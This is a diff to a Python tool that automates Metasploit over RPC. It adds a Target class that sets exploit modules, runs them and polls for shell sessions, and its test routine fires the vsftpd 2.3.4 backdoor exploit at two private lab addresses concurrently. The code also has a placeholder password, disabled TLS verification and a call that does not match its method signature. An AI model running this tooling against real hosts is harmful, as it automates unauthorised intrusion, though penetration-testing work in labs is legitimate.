@@ -98,7 +98,13 @@ class RpcClient:
     def post_request(self, url, payload):
         return requests.post(url, data=payload, headers=self.headers, verify=False)
 
+
+
+
 class Console:
+
+    validate_modules = []
+
     def __init__(self) -> None:
         self.rpc = RpcClient('yourpassword', ssl=True)
         self.client = MsfRpcClient('yourpassword', ssl=True)
@@ -114,10 +120,12 @@ class Console:
         return self.client.modules.search(module_name)
 
     def is_valid_module(self, module_name):
+        if module_name in Console.validate_modules: return True
         modules_data = self.search_module(module_name)
         for module in modules_data:
             if module_name == module['fullname']: 
                 logging.debug(f"valid module selected -> {module['fullname']}")
+                Console.validate_modules.append(module["fullname"])
                 return True
         logging.error(f"invalid module selected -> {module_name}")
         return False
@@ -169,40 +177,6 @@ class Console:
         for result in results:
             logging.debug(result)
 
-    async def is_job_completed(self, ip):
-        sessions_data = self.rpc.call("session.list")
-        jobs_data = self.rpc.call("job.list")
-        logging.debug(self.attempts[ip])
-        logging.debug(sessions_data)
-        logging.debug(jobs_data)
-        job_lookup = self.attempts[ip]
-        lookup_id = job_lookup["job_id"]
-        lookup_uuid = job_lookup["uuid"]
-        is_job = False
-        is_session = False
-        session_id = None
-        for job_id in jobs_data.keys():
-            if str(job_id) == str(lookup_id):
-                is_job = True
-                break
-
-        for session in sessions_data.keys():
-            if sessions_data[session]["exploit_uuid"] == lookup_uuid:
-                session_id = session
-                is_session = True
-                break
-        if is_job and not is_session:
-            logging.debug("job is still running")
-            return (False, None)
-        if (not is_job and is_session) or (is_job and is_session):
-            logging.debug("job completed and a session was created")
-            logging.debug(f"sesion_id -> {session_id}")
-            return (True, session_id)
-        if not is_job and not is_session:
-            logging.warning("job completed but no session was created")
-            return (True, None)
-
-
     async def run_payload(self, shell_path, ip):
         if self.exploit is None: return
         is_exploited, session_id = self.is_exploited(ip)
@@ -237,7 +211,6 @@ class Console:
         logging.debug(shell.write(command))
         logging.debug(shell.read())
         logging.debug(self.rpc.call("session.list"))
-
         
     def get_sessions(self):
         return self.client.sessions.list
@@ -259,7 +232,6 @@ class Console:
         # shell = client.sessions.session('1')
         # shell.write('whoami')
         # print(shell.read())
-
 
     async def test(self):
         logging.debug("before: "+str(self.client.sessions.list))
@@ -288,17 +260,84 @@ class Console:
             "192.168.17.130": ('exploit/unix/ftp/vsftpd_234_backdoor','cmd/unix/interact',{"RHOSTS":"192.168.17.130"}),
             "192.168.17.131": ('exploit/unix/ftp/vsftpd_234_backdoor','cmd/unix/interact',{"RHOSTS":"192.168.17.131"}),
         }
-        await self.run_payloads(targets)
+        target1 = Target(self.rpc,"192.168.17.130",self)
+        target2 = Target(self.rpc,"192.168.17.131",self)
+        target1.set_payload("exploit","exploit/unix/ftp/vsftpd_234_backdoor")
+        target2.set_payload("exploit","exploit/unix/ftp/vsftpd_234_backdoor")
+        target1.set_arguments({"RHOSTS":"192.168.17.130"})
+        target2.set_arguments({"RHOSTS":"192.168.17.131"})
+        await asyncio.gather(target1.run_payload(), target2.run_payload())
+        # await self.run_payloads(targets)
 
-async def testing():
+class Target:
+    def __init__(self, rpc: RpcClient, ip, console: Console) -> None:
+        self.rpc = rpc
+        self.ip = ip
+        self.console = console
+        self.exploit = None
+        self.exploit_result = {}
 
-    db = ExploitDB()
-    console = Console(db=db)
-    await console.test()
-    # await console.start_msfconsole()
-    # await console.set_payload("exploit/linux/postgres/postgres_payload")
-    # await console.set_argument("tt","a")
-    # await console.set_argument("rhosts", "192.168.17.130")
-    # await console.set_argument("lhost","eth0")
-    # await console.run_payload()
+    def set_payload(self, mtype, mname):
+        if not self.console.is_valid_module(mname):
+            logging.error("payload has not been set")
+            return
+        self.exploit = self.console.client.modules.use(mtype, mname)
+    
+    def set_arguments(self, arguments):
+        if self.exploit is None: return
+        for argument in arguments.keys():
+            self.exploit[argument] = arguments[argument]
 
+    async def run_payload(self, shell_path, ip):
+        if self.exploit is None: return
+        is_exploited, session_id = self.console.is_exploited(ip)
+        if is_exploited:
+            logging.warning(f"target {ip} already has a session; session_id -> {session_id} ")
+            return session_id
+
+        exploit_result = self.exploit.execute(payload=shell_path)
+        self.exploit_result = exploit_result
+        exploit_result["ip"] = ip
+        completed = False
+        while not completed:
+            logging.debug(f"checking status for job -> {exploit_result['job_id']}")
+            completed, session_id = await self.is_job_completed(ip)
+            await asyncio.sleep(1)
+
+        if exploit_result["job_id"] == None or session_id == None:
+            logging.error("payload failed")
+            return
+        return session_id
+
+    async def is_job_completed(self, ip):
+        sessions_data = self.rpc.call("session.list")
+        jobs_data = self.rpc.call("job.list")
+        logging.debug(self.exploit_result)
+        logging.debug(sessions_data)
+        logging.debug(jobs_data)
+        job_lookup = self.exploit_result
+        lookup_id = job_lookup["job_id"]
+        lookup_uuid = job_lookup["uuid"]
+        is_job = False
+        is_session = False
+        session_id = None
+        for job_id in jobs_data.keys():
+            if str(job_id) == str(lookup_id):
+                is_job = True
+                break
+
+        for session in sessions_data.keys():
+            if sessions_data[session]["exploit_uuid"] == lookup_uuid:
+                session_id = session
+                is_session = True
+                break
+        if is_job and not is_session:
+            logging.debug("job is still running")
+            return (False, None)
+        if (not is_job and is_session) or (is_job and is_session):
+            logging.debug("job completed and a session was created")
+            logging.debug(f"sesion_id -> {session_id}")
+            return (True, session_id)
+        if not is_job and not is_session:
+            logging.warning("job completed but no session was created")
+            return (True, None)
